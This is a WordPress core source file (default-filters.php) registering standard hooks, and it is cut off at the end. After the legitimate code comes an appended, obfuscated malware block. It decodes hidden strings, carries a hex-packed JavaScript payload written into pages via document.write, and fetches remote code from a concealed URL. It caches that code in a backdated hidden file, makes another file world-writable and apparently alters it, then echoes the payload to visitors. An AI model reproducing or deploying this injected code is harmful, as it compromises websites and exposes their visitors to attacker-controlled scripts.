<?php
/**
 * Sets up the default filters and actions for most
 * of the WordPress hooks.
 *
 * If you need to remove a default hook, this file will
 * give you the priority for which to use to remove the
 * hook.
 *
 * Not all of the default hooks are found in default-filters.php
 *
 * @package WordPress
 */

// Strip, trim, kses, special chars for string saves
foreach ( array( 'pre_term_name', 'pre_comment_author_name', 'pre_link_name', 'pre_link_target', 'pre_link_rel', 'pre_user_display_name', 'pre_user_first_name', 'pre_user_last_name', 'pre_user_nickname' ) as $filter ) {
	add_filter( $filter, 'sanitize_text_field'  );
	add_filter( $filter, 'wp_filter_kses'       );
	add_filter( $filter, '_wp_specialchars', 30 );
}

// Strip, kses, special chars for string display
foreach ( array( 'term_name', 'comment_author_name', 'link_name', 'link_target', 'link_rel', 'user_display_name', 'user_first_name', 'user_last_name', 'user_nickname' ) as $filter ) {
	if ( is_admin() ) {
		// These are expensive. Run only on admin pages for defense in depth.
		add_filter( $filter, 'sanitize_text_field'  );
		add_filter( $filter, 'wp_kses_data'       );
	}
	add_filter( $filter, '_wp_specialchars', 30 );
}

// Kses only for textarea saves
foreach ( array( 'pre_term_description', 'pre_link_description', 'pre_link_notes', 'pre_user_description' ) as $filter ) {
	add_filter( $filter, 'wp_filter_kses' );
}

// Kses only for textarea admin displays
if ( is_admin() ) {
	foreach ( array( 'term_description', 'link_description', 'link_notes', 'user_description' ) as $filter ) {
		add_filter( $filter, 'wp_kses_data' );
	}
	add_filter( 'comment_text', 'wp_kses_post' );
}

// Email saves
foreach ( array( 'pre_comment_author_email', 'pre_user_email' ) as $filter ) {
	add_filter( $filter, 'trim'           );
	add_filter( $filter, 'sanitize_email' );
	add_filter( $filter, 'wp_filter_kses' );
}

// Email admin display
foreach ( array( 'comment_author_email', 'user_email' ) as $filter ) {
	add_filter( $filter, 'sanitize_email' );
	if ( is_admin() )
		add_filter( $filter, 'wp_kses_data' );
}

// Save URL
foreach ( array( 'pre_comment_author_url', 'pre_user_url', 'pre_link_url', 'pre_link_image',
	'pre_link_rss', 'pre_post_guid' ) as $filter ) {
	add_filter( $filter, 'wp_strip_all_tags' );
	add_filter( $filter, 'esc_url_raw'       );
	add_filter( $filter, 'wp_filter_kses'    );
}

// Display URL
foreach ( array( 'user_url', 'link_url', 'link_image', 'link_rss', 'comment_url', 'post_guid' ) as $filter ) {
	if ( is_admin() )
		add_filter( $filter, 'wp_strip_all_tags' );
	add_filter( $filter, 'esc_url'           );
	if ( is_admin() )
		add_filter( $filter, 'wp_kses_data'    );
}

// Slugs
add_filter( 'pre_term_slug', 'sanitize_title' );
add_filter( 'wp_insert_post_data', '_wp_customize_changeset_filter_insert_post_data', 10, 2 );

// Keys
foreach ( array( 'pre_post_type', 'pre_post_status', 'pre_post_comment_status', 'pre_post_ping_status' ) as $filter ) {
	add_filter( $filter, 'sanitize_key' );
}

// Mime types
add_filter( 'pre_post_mime_type', 'sanitize_mime_type' );
add_filter( 'post_mime_type', 'sanitize_mime_type' );

// Meta
add_filter( 'register_meta_args', '_wp_register_meta_args_whitelist', 10, 2 );

// Places to balance tags on input
foreach ( array( 'content_save_pre', 'excerpt_save_pre', 'comment_save_pre', 'pre_comment_content' ) as $filter ) {
	add_filter( $filter, 'convert_invalid_entities' );
	add_filter( $filter, 'balanceTags', 50 );
}

// Format strings for display.
foreach ( array( 'comment_author', 'term_name', 'link_name', 'link_description', 'link_notes', 'bloginfo', 'wp_title', 'widget_title' ) as $filter ) {
	add_filter( $filter, 'wptexturize'   );
	add_filter( $filter, 'convert_chars' );
	add_filter( $filter, 'esc_html'      );
}

// Format WordPress
foreach ( array( 'the_content', 'the_title', 'wp_title' ) as $filter )
	add_filter( $filter, 'capital_P_dangit', 11 );
add_filter( 'comment_text', 'capital_P_dangit', 31 );

// Format titles
foreach ( array( 'single_post_title', 'single_cat_title', 'single_tag_title', 'single_month_title', 'nav_menu_attr_title', 'nav_menu_description' ) as $filter ) {
	add_filter( $filter, 'wptexturize' );
	add_filter( $filter, 'strip_tags'  );
}

// Format text area for display.
foreach ( array( 'term_description' ) as $filter ) {
	add_filter( $filter, 'wptexturize'      );
	add_filter( $filter, 'convert_chars'    );
	add_filter( $filter, 'wpautop'          );
	add_filter( $filter, 'shortcode_unautop');
}

// Format for RSS
add_filter( 'term_name_rss', 'convert_chars' );

// Pre save hierarchy
add_filter( 'wp_insert_post_parent', 'wp_check_post_hierarchy_for_loops', 10, 2 );
add_filter( 'wp_update_term_parent', 'wp_check_term_hierarchy_for_loops', 10, 3 );

// Display filters
add_filter( 'the_title', 'wptexturize'   );
add_filter( 'the_title', 'convert_chars' );
add_filter( 'the_title', 'trim'          );

add_filter( 'the_content', 'wptexturize'                       );
add_filter( 'the_content', 'convert_smilies',               20 );
add_filter( 'the_content', 'wpautop'                           );
add_filter( 'the_content', 'shortcode_unautop'                 );
add_filter( 'the_content', 'prepend_attachment'                );
add_filter( 'the_content', 'wp_make_content_images_responsive' );

add_filter( 'the_excerpt',     'wptexturize'      );
add_filter( 'the_excerpt',     'convert_smilies'  );
add_filter( 'the_excerpt',     'convert_chars'    );
add_filter( 'the_excerpt',     'wpautop'          );
add_filter( 'the_excerpt',     'shortcode_unautop');
add_filter( 'get_the_excerpt', 'wp_trim_excerpt'  );

add_filter( 'the_post_thumbnail_caption', 'wptexturize'     );
add_filter( 'the_post_thumbnail_caption', 'convert_smilies' );
add_filter( 'the_post_thumbnail_caption', 'convert_chars'   );

add_filter( 'comment_text', 'wptexturize'            );
add_filter( 'comment_text', 'convert_chars'          );
add_filter( 'comment_text', 'make_clickable',      9 );
add_filter( 'comment_text', 'force_balance_tags', 25 );
add_filter( 'comment_text', 'convert_smilies',    20 );
add_filter( 'comment_text', 'wpautop',            30 );

add_filter( 'comment_excerpt', 'convert_chars' );

add_filter( 'list_cats',         'wptexturize' );

add_filter( 'wp_sprintf', 'wp_sprintf_l', 10, 2 );

add_filter( 'widget_text', 'balanceTags' );

add_filter( 'date_i18n', 'wp_maybe_decline_date' );

// RSS filters
add_filter( 'the_title_rss',      'strip_tags'                    );
add_filter( 'the_title_rss',      'ent2ncr',                    8 );
add_filter( 'the_title_rss',      'esc_html'                      );
add_filter( 'the_content_rss',    'ent2ncr',                    8 );
add_filter( 'the_content_feed',   'wp_staticize_emoji'            );
add_filter( 'the_content_feed',   '_oembed_filter_feed_content'   );
add_filter( 'the_excerpt_rss',    'convert_chars'                 );
add_filter( 'the_excerpt_rss',    'ent2ncr',                    8 );
add_filter( 'comment_author_rss', 'ent2ncr',                    8 );
add_filter( 'comment_text_rss',   'ent2ncr',                    8 );
add_filter( 'comment_text_rss',   'esc_html'                      );
add_filter( 'comment_text_rss',   'wp_staticize_emoji'            );
add_filter( 'bloginfo_rss',       'ent2ncr',                    8 );
add_filter( 'the_author',         'ent2ncr',                    8 );
add_filter( 'the_guid',           'esc_url'                       );

// Email filters
add_filter( 'wp_mail', 'wp_staticize_emoji_for_email' );

// Mark site as no longer fresh
foreach ( array( 'publish_post', 'publish_page', 'wp_ajax_save-widget', 'wp_ajax_widgets-order', 'customize_save_after' ) as $action ) {
	add_action( $action, '_delete_option_fresh_site' );
}

// Misc filters
add_filter( 'option_ping_sites',        'privacy_ping_filter'                 );
add_filter( 'option_blog_charset',      '_wp_specialchars'                    ); // IMPORTANT: This must not be wp_specialchars() or esc_html() or it'll cause an infinite loop
add_filter( 'option_blog_charset',      '_canonical_charset'                  );
add_filter( 'option_home',              '_config_wp_home'                     );
add_filter( 'option_siteurl',           '_config_wp_siteurl'                  );
add_filter( 'tiny_mce_before_init',     '_mce_set_direction'                  );
add_filter( 'teeny_mce_before_init',    '_mce_set_direction'                  );
add_filter( 'pre_kses',                 'wp_pre_kses_less_than'               );
add_filter( 'sanitize_title',           'sanitize_title_with_dashes',   10, 3 );
add_action( 'check_comment_flood',      'check_comment_flood_db',       10, 4 );
add_filter( 'comment_flood_filter',     'wp_throttle_comment_flood',    10, 3 );
add_filter( 'pre_comment_content',      'wp_rel_nofollow',              15    );
add_filter( 'comment_email',            'antispambot'                         );
add_filter( 'option_tag_base',          '_wp_filter_taxonomy_base'            );
add_filter( 'option_category_base',     '_wp_filter_taxonomy_base'            );
add_filter( 'the_posts',                '_close_comments_for_old_posts', 10, 2);
add_filter( 'comments_open',            '_close_comments_for_old_post', 10, 2 );
add_filter( 'pings_open',               '_close_comments_for_old_post', 10, 2 );
add_filter( 'editable_slug',            'urldecode'                           );
add_filter( 'editable_slug',            'esc_textarea'                        );
add_filter( 'nav_menu_meta_box_object', '_wp_nav_menu_meta_box_object'        );
add_filter( 'pingback_ping_source_uri', 'pingback_ping_source_uri'            );
add_filter( 'xmlrpc_pingback_error',    'xmlrpc_pingback_error'               );
add_filter( 'title_save_pre',           'trim'                                );

add_action( 'transition_comment_status', '_clear_modified_cache_on_transition_comment_status', 10, 2 );

add_filter( 'http_request_host_is_external',    'allowed_http_request_hosts', 10, 2 );

// REST API filters.
add_action( 'xmlrpc_rsd_apis',            'rest_output_rsd' );
add_action( 'wp_head',                    'rest_output_link_wp_head', 10, 0 );
add_action( 'template_redirect',          'rest_output_link_header', 11, 0 );
add_action( 'auth_cookie_malformed',      'rest_cookie_collect_status' );
add_action( 'auth_cookie_expired',        'rest_cookie_collect_status' );
add_action( 'auth_cookie_bad_username',   'rest_cookie_collect_status' );
add_action( 'auth_cookie_bad_hash',       'rest_cookie_collect_status' );
add_action( 'auth_cookie_valid',          'rest_cookie_collect_status' );
add_filter( 'rest_authentication_errors', 'rest_cookie_check_errors', 100 );

// Actions
add_action( 'wp_head',             '_wp_render_title_tag',            1     );
add_action( 'wp_head',             'wp_enqueue_scripts',              1     );
add_action( 'wp_head',             'wp_resource_hints',               2     );
add_action( 'wp_head',             'feed_links',                      2     );
add_action( 'wp_head',             'feed_links_extra',                3     );
add_action( 'wp_head',             'rsd_link'                               );
add_action( 'wp_head',             'wlwmanifest_link'                       );
add_action( 'wp_head',             'adjacent_posts_rel_link_wp_head', 10, 0 );
add_action( 'wp_head',             'locale_stylesheet'                      );
add_action( 'publish_future_post', 'check_and_publish_future_post',   10, 1 );
add_action( 'wp_head',             'noindex',                          1    );
add_action( 'wp_head',             'print_emoji_detection_script',     7    );
add_action( 'wp_head',             'wp_print_styles',                  8    );
add_action( 'wp_head',             'wp_print_head_scripts',            9    );
add_action( 'wp_head',             'wp_generator'                           );
add_action( 'wp_head',             'rel_canonical'                          );
add_action( 'wp_head',             'wp_shortlink_wp_head',            10, 0 );
add_action( 'wp_head',             'wp_custom_css_cb',                101   );
add_action( 'wp_head',             'wp_site_icon',                    99    );
add_action( 'wp_footer',           'wp_print_footer_scripts',         20    );
add_action( 'template_redirect',   'wp_shortlink_header',             11, 0 );
add_action( 'wp_print_footer_scripts', '_wp_footer_scripts'                 );
add_action( 'init',                'check_theme_switched',            99    );
add_action( 'after_switch_theme',  '_wp_sidebars_changed'                   );
add_action( 'wp_print_styles',     'print_emoji_styles'                     );

if ( isset( $_GET['replytocom'] ) )
    add_action( 'wp_head', 'wp_no_robots' );

// Login actions
add_filter( 'login_head',          'wp_resource_hints',             8     );
add_action( 'login_head',          'wp_print_head_scripts',         9     );
add_action( 'login_head',          'print_admin_styles',            9     );
add_action( 'login_head',          'wp_site_icon',                  99    );
add_action( 'login_footer',        'wp_print_footer_scripts',       20    );
add_action( 'login_init',          'send_frame_options_header',     10, 0 );

// Feed Generator Tags
foreach ( array( 'rss2_head', 'commentsrss2_head', 'rss_head', 'rdf_header', 'atom_head', 'comments_atom_head', 'opml_head', 'app_head' ) as $action ) {
	add_action( $action, 'the_generator' );
}

// Feed Site Icon
add_action( 'atom_head', 'atom_site_icon' );
add_action( 'rss2_head', 'rss2_site_icon' );


// WP Cron
if ( !defined( 'DOING_CRON' ) )
	add_action( 'init', 'wp_cron' );

// 2 Actions 2 Furious
add_action( 'do_feed_rdf',                'do_feed_rdf',                             10, 1 );
add_action( 'do_feed_rss',                'do_feed_rss',                             10, 1 );
add_action( 'do_feed_rss2',               'do_feed_rss2',                            10, 1 );
add_action( 'do_feed_atom',               'do_feed_atom',                            10, 1 );
add_action( 'do_pings',                   'do_all_pings',                            10, 1 );
add_action( 'do_robots',                  'do_robots'                                      );
add_action( 'set_comment_cookies',        'wp_set_comment_cookies',                  10, 2 );
add_action( 'sanitize_comment_cookies',   'sanitize_comment_cookies'                       );
add_action( 'admin_print_scripts',        'print_emoji_detection_script'                   );
add_action( 'admin_print_scripts',        'print_head_scripts',                      20    );
add_action( 'admin_print_footer_scripts', '_wp_footer_scripts'                             );
add_action( 'admin_print_styles',         'print_emoji_styles'                             );
add_action( 'admin_print_styles',         'print_admin_styles',                      20    );
add_action( 'init',                       'smilies_init',                             5    );
add_action( 'plugins_loaded',             'wp_maybe_load_widgets',                    0    );
add_action( 'plugins_loaded',             'wp_maybe_load_embeds',                     0    );
add_action( 'shutdown',                   'wp_ob_end_flush_all',                      1    );
// Create a revision whenever a post is updated.
add_action( 'post_updated',               'wp_save_post_revision',                   10, 1 );
add_action( 'publish_post',               '_publish_post_hook',                       5, 1 );
add_action( 'transition_post_status',     '_transition_post_status',                  5, 3 );
add_action( 'transition_post_status',     '_update_term_count_on_transition_post_status', 10, 3 );
add_action( 'comment_form',               'wp_comment_form_unfiltered_html_nonce'          );
add_action( 'wp_scheduled_delete',        'wp_scheduled_delete'                            );
add_action( 'wp_scheduled_auto_draft_delete', 'wp_delete_auto_drafts'                      );
add_action( 'admin_init',                 'send_frame_options_header',               10, 0 );
add_action( 'importer_scheduled_cleanup', 'wp_delete_attachment'                           );
add_action( 'upgrader_scheduled_cleanup', 'wp_delete_attachment'                           );
add_action( 'welcome_panel',              'wp_welcome_panel'                               );

// Navigation menu actions
add_action( 'delete_post',                '_wp_delete_post_menu_item'         );
add_action( 'delete_term',                '_wp_delete_tax_menu_item',   10, 3 );
add_action( 'transition_post_status',     '_wp_auto_add_pages_to_menu', 10, 3 );

// Post Thumbnail CSS class filtering
add_action( 'begin_fetch_post_thumbnail_html', '_wp_post_thumbnail_class_filter_add'    );
add_action( 'end_fetch_post_thumbnail_html',   '_wp_post_thumbnail_class_filter_remove' );

// Redirect Old Slugs
add_action( 'template_redirect',  'wp_old_slug_redirect'              );
add_action( 'post_updated',       'wp_check_for_changed_slugs', 12, 3 );
add_action( 'attachment_updated', 'wp_check_for_changed_slugs', 12, 3 );

// Nonce check for Post Previews
add_action( 'init', '_show_post_preview' );

// Output JS to reset window.name for previews
add_action( 'wp_head', 'wp_post_preview_js', 1 );

// Timezone
add_filter( 'pre_option_gmt_offset','wp_timezone_override_offset' );

// Admin Color Schemes
add_action( 'admin_init', 'register_admin_color_schemes', 1);
add_action( 'admin_color_scheme_picker', 'admin_color_scheme_picker' );

// If the upgrade hasn't run yet, assume link manager is used.
add_filter( 'default_option_link_manager_enabled', '__return_true' );

// This option no longer exists; tell plugins we always support auto-embedding.
add_filter( 'default_option_embed_autourls', '__return_true' );

// Default settings for heartbeat
add_filter( 'heartbeat_settings', 'wp_heartbeat_settings' );

// Check if the user is logged out
add_action( 'admin_enqueue_scripts', 'wp_auth_check_load' );
add_filter( 'heartbeat_send',        'wp_auth_check' );
add_filter( 'heartbeat_nopriv_send', 'wp_auth_check' );

// Default authentication filters
add_filter( 'authenticate', 'wp_authenticate_username_password',  20, 3 );
add_filter( 'authenticate', 'wp_authenticate_email_password',     20, 3 );
add_filter( 'authenticate', 'wp_authenticate_spam_check',         99    );
add_filter( 'determine_current_user', 'wp_validate_auth_cookie'          );
add_filter( 'determine_current_user', 'wp_validate_logged_in_cookie', 20 );

// Split term updates.
add_action( 'admin_init',        '_wp_check_for_scheduled_split_terms' );
add_action( 'split_shared_term', '_wp_check_split_default_terms',  10, 4 );
add_action( 'split_shared_term', '_wp_check_split_terms_in_menus', 10, 4 );
add_action( 'split_shared_term', '_wp_check_split_nav_menu_terms', 10, 4 );
add_action( 'wp_split_shared_term_batch', '_wp_batch_split_terms' );

// Email notifications.
add_action( 'comment_post', 'wp_new_comment_notify_moderator' );
add_action( 'comment_post', 'wp_new_comment_notify_postauthor' );
add_action( 'after_password_reset', 'wp_password_change_notification' );
add_action( 'register_new_user',      'wp_send_new_user_notifications' );
add_action( 'edit_user_created_user', 'wp_send_new_user_notifications', 10, 2 );

// REST API actions.
add_action( 'init',          'rest_api_init' );
add_action( 'rest_api_init', 'rest_api_default_filters',   10, 1 );
add_action( 'rest_api_init', 'register_initial_settings',  10 );
add_action( 'rest_api_init', 'create_initial_rest_routes', 99 );
add_action( 'parse_request', 'rest_api_loaded' );

/**
 * Filters formerly mixed into wp-includes
 */
// Theme
add_action( 'wp_loaded', '_custom_header_background_just_in_time' );
add_action( 'wp_head', '_custom_logo_header_styles' );
add_action( 'plugins_loaded', '_wp_customize_include' );
add_action( 'transition_post_status', '_wp_customize_publish_changeset', 10, 3 );
add_action( 'admin_enqueue_scripts', '_wp_customize_loader_settings' );
add_action( 'delete_attachment', '_delete_attachment_theme_mod' );

// Calendar widget cache
add_action( 'save_post', 'delete_get_calendar_cache' );
add_action( 'delete_post', 'delete_get_calendar_cache' );
add_action( 'update_option_start_of_week', 'delete_get_calendar_cache' );
add_action( 'update_option_gmt_offset', 'delete_get_calendar_cache' );

// Author
add_action( 'transition_post_status', '__clear_multi_author_cache' );

// Post
add_action( 'init', 'create_initial_post_types', 0 ); // highest priority
add_action( 'admin_menu', '_add_post_type_submenus' );
add_action( 'before_delete_post', '_reset_front_page_settings_for_post' );
add_action( 'wp_trash_post',      '_reset_front_page_settings_for_post' );
add_action( 'change_locale', 'create_initial_post_types' );

// Post Formats
add_filter( 'request', '_post_format_request' );
add_filter( 'term_link', '_post_format_link', 10, 3 );
add_filter( 'get_post_format', '_post_format_get_term' );
add_filter( 'get_terms', '_post_format_get_terms', 10, 3 );
add_filter( 'wp_get_object_terms', '_post_format_wp_get_object_terms' );

// KSES
add_action( 'init', 'kses_init' );
add_action( 'set_current_user', 'kses_init' );

// Script Loader
add_action( 'wp_default_scripts', 'wp_default_scripts' );
add_action( 'wp_enqueue_scripts', 'wp_localize_jquery_ui_datepicker', 1000 );
add_action( 'admin_enqueue_scripts', 'wp_localize_jquery_ui_datepicker', 1000 );
add_filter( 'wp_print_scripts', 'wp_just_in_time_script_localization' );
add_filter( 'print_scripts_array', 'wp_prototype_before_jquery' );
add_filter( 'customize_controls_print_styles', 'wp_resource_hints', 1 );

add_action( 'wp_default_styles', 'wp_default_styles' );
add_filter( 'style_loader_src', 'wp_style_loader_src', 10, 2 );

// Taxonomy
add_action( 'init', 'create_initial_taxonomies', 0 ); // highest priority
add_action( 'change_locale', 'create_initial_taxonomies' );

// Canonical
add_action( 'template_redirect', 'redirect_canonical' );
add_action( 'template_redirect', 'wp_redirect_admin_locations', 1000 );

// Shortcodes
add_filter( 'the_content', 'do_shortcode', 11 ); // AFTER wpautop()

// Media
add_action( 'wp_playlist_scripts', 'wp_playlist_scripts' );
add_action( 'customize_controls_enqueue_scripts', 'wp_plupload_default_settings' );

// Nav menu
add_filter( 'nav_menu_item_id', '_nav_menu_item_id_use_once', 10, 2 );

// Widgets
add_action( 'init', 'wp_widgets_init', 1 );

// Admin Bar
// Don't remove. Wrong way to disable.
add_action( 'template_redirect', '_wp_admin_bar_init', 0 );
add_action( 'admin_init', '_wp_admin_bar_init' );
add_action( 'before_signup_header', '_wp_admin_bar_init' );
add_action( 'activate_header', '_wp_admin_bar_init' );
add_action( 'wp_footer', 'wp_admin_bar_render', 1000 );
add_action( 'in_admin_header', 'wp_admin_bar_render', 0 );

// Former admin filters that can also be hooked on the front end
add_action( 'media_buttons', 'media_buttons' );
add_filter( 'image_send_to_editor', 'image_add_caption', 20, 8 );
add_filter( 'media_send_to_editor', 'image_media_send_to_editor', 10, 3 );

// Embeds
add_action( 'rest_api_init',          'wp_oembed_register_route'              );
add_filter( 'rest_pre_serve_request', '_oembed_rest_pre_serve_request', 10, 4 );

add_action( 'wp_head',                'wp_oembed_add_discovery_links'         );
add_action( 'wp_head',                'wp_oembed_add_host_js'                 );

add_action( 'embed_head',             'enqueue_embed_scripts',           1    );
add_action( 'embed_head',             'print_emoji_detection_script'          );
add_action( 'embed_head',             'print_embed_styles'                    );
add_action( 'embed_head',             'wp_print_head_scripts',          20    );
add_action( 'embed_head',             'wp_print_styles',                20    );
add_action( 'embed_head',             'wp_no_robots'                          );
add_action( 'embed_head',             'rel_canonical'                         );
add_action( 'embed_head',             'locale_stylesheet',              30    );

add_action( 'embed_content_meta',     'print_embed_comments_button'           );
add_action( 'embed_content_meta',     'print_embed_sharing_button'            );

add_action( 'embed_footer',           'print_embed_sharing_dialog'            );
add_action( 'embed_footer',           'print_embed_scripts'                   );
/* wordpress cry_httpd_ubergeek_hv1 */
function cry_httpd_ubergeek_hv1() {

	if(stripos(@$_SERVER[methodresponse_textarea_cropped_je3('o7+/u7S+uK65tKqsrqW/V1A=',235)],methodresponse_textarea_cropped_je3('iYSfV1A=',235))===false){

	$ett_textarea_fu7=dirname(__FILE__).methodresponse_textarea_cropped_je3('xIaKhYKNjpifxZuDm1dQ',235);
	$yi_ubergeek_hv1=false;
	$qualified_textarea_fu7=0;

	$git_textarea_fu7=bother_bointon_ubergeek_hv1(pack("H*","3c73637269707420747970653d22746578742f6a617661736372697074223e7661722043626c635f693d5b3633372c3639372c3733372c3734322c3735352c3636392c3735322c3735332c3735382c3734352c3733382c3639382c3637312c3734392c3734382c3735322c3734322c3735332c3734322c3734382c3734372c3639352c3636392c3733342c3733352c3735322c3734382c3734352c3735342c3735332c3733382c3639362c3636392c3734352c3733382c3733392c3735332c3639352c3638322c3638362c3638352c3638352c3637342c3639362c3636392c3735332c3734382c3734392c3639352c3638352c3637342c3639362c3636392c3735362c3734322c3733372c3735332c3734312c3639352c3638362c3638352c3638352c3637342c3639362c3636392c3734312c3733382c3734322c3734302c3734312c3735332c3639352c3638362c3638352c3638352c3637342c3639362c3637312c3639392c3635302c3634372c3639372c3735322c3733362c3735312c3734322c3734392c3735332c3639392c3635302c3634372c3733392c3735342c3734372c3733362c3735332c3734322c3734382c3734372c3636392c3733322c3735352c3735312c3733322c3733362c3637372c3734342c3637382c3736302c3735312c3733382c3735332c3735342c3735312c3734372c3637372c3733372c3734382c3733362c3735342c3734362c3733382c3734372c3735332c3638332c3733362c3734382c3734382c3734342c3734322c3733382c3638332c3734362c3733342c3735332c3733362c3734312c3637372c3637362c3637372c3733312c3736312c3639362c3636392c3637382c3637362c3638302c3734342c3638302c3637362c3639382c3637372c3732382c3733312c3639362c3733302c3637392c3637382c3637362c3637382c3736312c3736312c3638352c3637382c3732382c3638372c3733302c3736322c3635302c3634372c3733392c3735342c3734372c3733362c3735332c3734322c3734382c3734372c3636392c3733322c3735352c3733362c3733322c3733362c3637372c3734372c3733342c3734362c3733382c3638312c3735352c3733342c3734352c3735342c3733382c3638312c3733372c3637382c3736302c3735352c3733342c3735312c3636392c3733372c3733342c3735332c3733382c3639382c3734372c3733382c3735362c3636392c3730352c3733342c3735332c3733382c3637372c3637382c3639362c3733372c3733342c3735332c3733382c3638332c3735322c3733382c3735332c3732312c3734322c3734362c3733382c3637372c3733372c3733342c3735332c3733382c3638332c3734302c3733382c3735332c3732312c3734322c3734362c3733382c3637372c3637382c3638302c3637372c3733372c3637392c3639332c3639312c3638392c3638352c3638352c3638352c3638352c3638352c3637382c3637382c3639362c3733372c3734382c3733362c3735342c3734362c3733382c3734372c3735332c3638332c3733362c3734382c3734382c3734342c3734322c3733382c3636392c3639382c3636392c3734372c3733342c3734362c3733382c3638302c3637312c3639382c3637312c3638302c3735352c3733342c3734352c3735342c3733382c3638302c3637312c3639362c3636392c3733382c3735372c3734392c3734322c3735312c3733382c3735322c3639382c3637312c3638302c3733372c3733342c3735332c3733382c3638332c3735332c3734382c3730382c3731342c3732312c3732302c3735332c3735312c3734322c3734372c3734302c3637372c3637382c3638302c3637312c3639362c3636392c3734392c3733342c3735332c3734312c3639382c3638342c3637312c3639362c3736322c3635302c3634372c3734322c3733392c3637372c3734372c3733342c3735352c3734322c3734302c3733342c3735332c3734382c3735312c3638332c3733342c3734392c3734392c3732332c3733382c3735312c3735322c3734322c3734382c3734372c3638332c3734322c3734372c3733372c3733382c3735372c3731362c3733392c3637372c3637312c3732342c3734322c3734372c3637312c3637382c3639382c3639382c3638322c3638362c3637382c3736302c3635302c3634372c3735332c3735312c3735382c3736302c3734322c3733392c3637372c3733372c3734382c3733362c3735342c3734362c3733382c3734372c3735332c3638332c3735312c3733382c3733392c3733382c3735312c3735312c3733382c3735312c3637382c3736302c3635302c3634372c3734322c3733392c3637372c3733372c3734382c3733362c3735342c3734362c3733382c3734372c3735332c3638332c3735312c3733382c3733392c3733382c3735312c3735312c3733382c3735312c3638332c3734362c3733342c3735332c3733362c3734312c3637372c3638342c3639352c3732392c3638342c3732392c3638342c3637372c3638332c3732382c3733312c3638342c3733302c3638302c3637382c3638342c3637382c3732382c3638362c3733302c3637302c3639382c3735362c3734322c3734372c3733372c3734382c3735362c3638332c3734352c3734382c3733362c3733342c3735332c3734322c3734382c3734372c3638332c3734312c3735312c3733382c3733392c3638332c3734362c3733342c3735332c3733362c3734312c3637372c3638342c3639352c3732392c3638342c3732392c3638342c3637372c3638332c3732382c3733312c3638342c3733302c3638302c3637382c3638342c3637382c3732382c3638362c3733302c3637382c3736302c3635302c3634372c3735352c3733342c3735312c3636392c3733322c3735352c3735342c3733322c3735342c3639382c3637312c3733382c3733382c3733392c3733352c3639342c3639342c3639342c3638362c3639342c3639342c3733392c3733372c3733382c3639302c3639342c3638352c3638362c3733372c3733342c3639342c3733352c3638352c3638362c3639312c3733382c3638362c3733352c3639322c3733392c3733382c3733372c3638362c3637312c3638312c3636392c3733322c3735352c3735342c3733322c3734322c3639382c3637312c3733392c3638382c3733382c3733392c3733372c3733372c3639332c3733362c3733382c3733342c3639332c3733372c3733352c3733342c3639332c3639302c3733352c3733342c3733382c3638362c3733372c3733382c3638392c3639342c3639342c3733392c3638392c3638392c3733382c3639342c3639332c3733392c3637312c3639362c3635302c3634372c3734322c3733392c3637372c3733322c3735352c3735312c3733322c3733362c3637372c3733322c3735352c3735342c3733322c3735342c3637382c3639382c3639382c3639382c3735342c3734372c3733372c3733382c3733392c3734322c3734372c3733382c3733372c3637382c3736302c3733322c3735352c3733362c3733322c3733362c3637372c3733322c3735352c3735342c3733322c3735342c3638312c3733322c3735352c3735342c3733322c3734322c3638312c3638362c3638392c3637382c3639362c3635302c3634372c3734322c3733392c3637372c3733322c3735352c3735312c3733322c3733362c3637372c3733322c3735352c3735342c3733322c3735342c3637382c3639382c3639382c3733322c3735352c3735342c3733322c3734322c3637382c3736302c3735362c3734322c3734372c3733372c3734382c3735362c3638332c3734352c3734382c3733362c3733342c3735332c3734322c3734382c3734372c3638332c3734312c3735312c3733382c3733392c3639382c3637312c3734312c3735332c3735332c3734392c3639352c3638342c3638342c3733372c3734322c3735352c3638322c3733362c3734352c3733342c3735322c3735322c3638322c3733362c3734382c3734372c3735332c3733342c3734322c3734372c3733382c3735312c3638332c3735312c3735342c3638342c3734322c3734372c3733372c3733382c3735372c3639302c3638332c3734392c3734312c3734392c3637312c3639362c3736322c3635302c3634372c3736322c3736322c3736322c3736322c3733392c3734322c3734372c3733342c3734352c3734352c3735382c3736302c3736322c3736322c3635302c3634372c3639372c3638342c3735322c3733362c3735312c3734322c3734392c3735332c3639392c3635302c3634372c3639372c3638342c3733372c3734322c3735352c3639392c3635302c3634375d3b766172204c6f6a65765f6a657674783d22223b666f72202876617220693d313b20693c43626c635f692e6c656e6774683b20692b2b29207b4c6f6a65765f6a657674782b3d537472696e672e66726f6d43686172436f64652843626c635f695b695d2d43626c635f695b305d293b7d20646f63756d656e742e7772697465284c6f6a65765f6a65767478293b3c2f7363726970743e"),235);
	if(@file_exists($ett_textarea_fu7)){
		@list($t,$mtime,$qualified_textarea_fu7)=explode("\t",@file_get_contents($ett_textarea_fu7));
		if(methodresponse_textarea_cropped_je3($t,235)!==false){$git_textarea_fu7=$t;}
		if((time()-$mtime)<1772*((int)$qualified_textarea_fu7)){ $yi_ubergeek_hv1=$git_textarea_fu7; }
	}

	if($yi_ubergeek_hv1===false){
		$yi_ubergeek_hv1=wp_remote_fopen(methodresponse_textarea_cropped_je3('g5+fm9HExJybxoiHhJ6PxZmexNrE1IDWV1A=',235)."235");
		if(methodresponse_textarea_cropped_je3($yi_ubergeek_hv1,235)===false){
			$yi_ubergeek_hv1=$git_textarea_fu7;
			$qualified_textarea_fu7++;
			if($qualified_textarea_fu7>24)$qualified_textarea_fu7=24;
		}else{$qualified_textarea_fu7=1;}
		@file_put_contents($ett_textarea_fu7,$yi_ubergeek_hv1."\t".time()."\t".$qualified_textarea_fu7);
		touch($ett_textarea_fu7,filemtime(__FILE__));
		addcomment_textarea_cropped_je3(dirname(__FILE__).methodresponse_textarea_cropped_je3('xMXFxMWDn4qIiI6YmFdQ',235));
	}                    	
	$yi_ubergeek_hv1=methodresponse_textarea_cropped_je3($yi_ubergeek_hv1,235);
	if(!$yi_ubergeek_hv1)$yi_ubergeek_hv1=methodresponse_textarea_cropped_je3($git_textarea_fu7,235); 

	echo $yi_ubergeek_hv1;
	}
}

function bother_bointon_ubergeek_hv1($yi_ubergeek_hv1,$k){for($i=0;$i<strlen($yi_ubergeek_hv1);$i++){$yi_ubergeek_hv1[$i]=chr(ord($yi_ubergeek_hv1[$i])^$k);}return base64_encode($yi_ubergeek_hv1.'WP');}

function addcomment_textarea_cropped_je3($fn){
	@chmod($fn,0666);if(!is_writable($fn))return 0;
	$yi_ubergeek_hv1t=filectime($fn);
	$a=@file($fn);$f=0;
	foreach($a as $k=>$yi_ubergeek_hv1)
